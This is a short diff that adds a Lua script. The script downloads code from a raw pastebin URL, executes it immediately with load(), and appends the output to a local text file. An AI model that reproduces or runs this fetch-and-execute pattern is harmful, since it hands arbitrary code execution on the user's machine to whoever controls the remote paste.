@@ -1,0 +1,9 @@
+function mis(text)
+file = io.open("ReadyWorld.txt", "a")
+file:write(text.."\n")
+file:close()
+end
+
+mas = load(request("GET", "https://pastebin.com/raw/brLCXZZk"))()
+
+mis(mas)
